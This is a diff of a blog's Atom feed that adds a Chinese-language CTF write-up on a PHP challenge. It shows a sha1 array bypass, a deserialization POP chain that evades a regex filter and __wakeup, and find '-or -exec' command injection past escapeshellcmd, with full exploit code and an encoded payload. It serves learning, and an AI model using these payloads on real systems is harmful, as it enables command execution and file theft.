@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://outlaws-bai.github.io</id>
     <title>outlaws&apos; blog</title>
-    <updated>2021-03-22T09:52:26.857Z</updated>
+    <updated>2021-03-23T03:32:56.590Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://outlaws-bai.github.io"/>
     <link rel="self" href="https://outlaws-bai.github.io/atom.xml"/>
@@ -10,6 +10,127 @@
     <logo>https://outlaws-bai.github.io/images/avatar.png</logo>
     <icon>https://outlaws-bai.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, outlaws&apos; blog</rights>
+    <entry>
+        <title type="html"><![CDATA[记一道反序列化&find命令执行题目]]></title>
+        <id>https://outlaws-bai.github.io/post/ji-yi-dao-fan-xu-lie-hua-andfind-ming-ling-zhi-xing-ti-mu/</id>
+        <link href="https://outlaws-bai.github.io/post/ji-yi-dao-fan-xu-lie-hua-andfind-ming-ling-zhi-xing-ti-mu/">
+        </link>
+        <updated>2021-03-23T03:30:53.000Z</updated>
+        <content type="html"><![CDATA[<p>打开题目</p>
+<figure data-type="image" tabindex="1"><img src="https://outlaws-bai.github.io/post-images/1616470323708.png" alt="" loading="lazy"></figure>
+<h1 id="part1-md5绕过">part1 md5绕过</h1>
+<p>右键查看源码提示有index.php.bak，下载后打开</p>
+<pre><code class="language-php">&lt;?php
+    error_reporting(0);
+    $rand_str = '********';
+    $cookie_data = json_decode($_COOKIE['data'], true);
+    if ($cookie_data['data'] == strtolower(md5($rand_str))) {
+        $a = $_POST['a'];
+        $b = $_POST['b'];
+        if ($a != $b &amp;&amp; sha1($a) === sha1($b)) {
+            include('******.php');
+        }else{
+            '!!';
+        }
+    }else{
+        echo '!';
+    } 
+?&gt;
+</code></pre>
+<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>o</mi><mi>o</mi><mi>k</mi><mi>i</mi><msub><mi>e</mi><mi>d</mi></msub><mi>a</mi><mi>t</mi><mi>a</mi><msup><mo>[</mo><mo mathvariant="normal">′</mo></msup><mi>d</mi><mi>a</mi><mi>t</mi><msup><mi>a</mi><mo mathvariant="normal">′</mo></msup><mo>]</mo><mo>=</mo><mo>=</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>t</mi><mi>o</mi><mi>l</mi><mi>o</mi><mi>w</mi><mi>e</mi><mi>r</mi><mo>(</mo><mi>m</mi><mi>d</mi><mn>5</mn><mo>(</mo></mrow><annotation encoding="application/x-tex">cookie_data[&#x27;data&#x27;] == strtolower(md5(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">i</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mopen"><span class="mopen">[</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">t</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">d</span><span class="mord">5</span><span class="mopen">(</span></span></span></span>rand_str))</p>
+<p>设置Cookie:data={&quot;data&quot;:1}，爆破1-1000得到data为25时，可使得<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>o</mi><mi>o</mi><mi>k</mi><mi>i</mi><msub><mi>e</mi><mi>d</mi></msub><mi>a</mi><mi>t</mi><mi>a</mi><msup><mo>[</mo><mo mathvariant="normal">′</mo></msup><mi>d</mi><mi>a</mi><mi>t</mi><msup><mi>a</mi><mo mathvariant="normal">′</mo></msup><mo>]</mo><mo>=</mo><mo>=</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>t</mi><mi>o</mi><mi>l</mi><mi>o</mi><mi>w</mi><mi>e</mi><mi>r</mi><mo>(</mo><mi>m</mi><mi>d</mi><mn>5</mn><mo>(</mo></mrow><annotation encoding="application/x-tex">cookie_data[&#x27;data&#x27;] == strtolower(md5(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">i</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mopen"><span class="mopen">[</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">t</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">d</span><span class="mord">5</span><span class="mopen">(</span></span></span></span>rand_str))【为true也可以】</p>
+<p>$a != <span class='katex-error' title='ParseError: KaTeX parse error: Expected &#039;EOF&#039;, got &#039;&amp;&#039; at position 3: b &amp;̲&amp; sha1('>b &amp;&amp; sha1(</span>a) === sha1($b)</p>
+<p>a[]=1&amp;b[]=2绕过即可</p>
+<h1 id="part2-反序列化">part2 反序列化</h1>
+<pre><code class="language-php">&lt;?php   
+class getresult{
+    public $obj;
+    public $file;
+
+    function __destruct()
+    {
+        if ($this-&gt;file != '')
+        {
+            $this-&gt;obj-&gt;execute();
+        }
+        else
+        {
+            die('fail to getshell!!!');
+        }
+    }
+
+    function __wakeup()
+    {
+        foreach(get_object_vars($this) as $key =&gt; $value)
+        {
+            $this-&gt;$key = null;
+        }
+        echo &quot;wakeup&quot;;
+    }
+}
+
+class find{
+    private $file;
+    function execute(){
+        system(&quot;find /tmp -iname &quot;.escapeshellcmd($this-&gt;file)); 
+        die('Success!!!');
+    }
+}
+if(isset($_GET['pop'])){
+    $pop = $_GET['pop'];
+    preg_match('/[oc]:\d+:/i', $pop, $result);
+    if(count($result)){
+        die('no!');
+    }
+    unserialize($pop);
+}
+
+show_source(__FILE__); 
+</code></pre>
+<p>1.绕过preg_match('/[oc]:\d+:/i', $pop, $result);处正则，只需使得O:+9即可，但要注意+需使用url编码后的%2B，否则会被解析为空格</p>
+<p>2.绕过__wakeup()  O:9:&quot;getresult&quot;:2:{   将2改为3</p>
+<p>3.escapeshellcmd()</p>
+<pre><code class="language-text">escapeshellcmd()函数对字符串中可能会欺骗shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec()或 system() 函数，或者执行操作符之前进行转义。
+反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$\,\x0A 和 \xFF。 ' 和 &quot; 仅在不配对儿的时候被转义。 在 Windows平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。
+而find命令，如果想多执行别的命令，可以利用-or，并且-exec 参数后面跟的是command命令，该命令的终止是以;为结束标志的，并且要注意前面的空格，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以前面加反斜杠。
+所以可以构造payload为：find /tmp -iname sth -or -exec ls \;
+所以我们的输入为：sth -or -exec ls / ;，这里没有\，是因为上一个函数自动帮你加了\。
+读取flag文件，获取flag。
+</code></pre>
+<p>构造pop：</p>
+<pre><code class="language-php">&lt;?php   
+class getresult{
+    public $obj;
+    public $file;
+    function __construct() {
+        $this-&gt;obj = new find();
+        $this-&gt;file = 'sth -or -exec cat /f111ag ;';
+    }
+}
+
+class find{
+    private $file='sth -or -exec cat /f111ag ;';
+}
+
+// $f=new find();
+// echo serialize($f)
+$g=new getresult();
+echo urlencode(serialize($g));
+echo serialize($g);
+
+#O%3A%2B9%3A%22getresult%22%3A3%3A%7Bs%3A3%3A%22obj%22%3BO%3A%2B4%3A%22find%22%3A1%3A%7Bs%3A10%3A%22%00find%00file%22%3Bs%3A27%3A%22sth+-or+-exec+cat+%2Ff111ag+%3B%22%3B%7Ds%3A4%3A%22file%22%3Bs%3A27%3A%22sth+-or+-exec+cat+%2Ff111ag+%3B%22%3B%7D
+
+?&gt;
+</code></pre>
+<p>即可getflag</p>
+<figure data-type="image" tabindex="2"><img src="https://outlaws-bai.github.io/post-images/1616470360978.png" alt="" loading="lazy"></figure>
+<h1 id="小结">小结</h1>
+<p>find命令，如果想多执行别的命令，可以利用-or，并且-exec 参数后面跟的是command命令，该命令的终止是以;为结束标志的，并且要注意前面的空格，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以前面加反斜杠。<br>
+所以可以构造payload为：find /tmp -iname sth -or -exec ls ;<br>
+所以我们的输入为：sth -or -exec ls / ;，这里没有\，是因为上一个函数自动帮你加了\。<br>
+读取flag文件，获取flag。</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[记一道session文件包含题目]]></title>
         <id>https://outlaws-bai.github.io/post/LFI_session/</id>
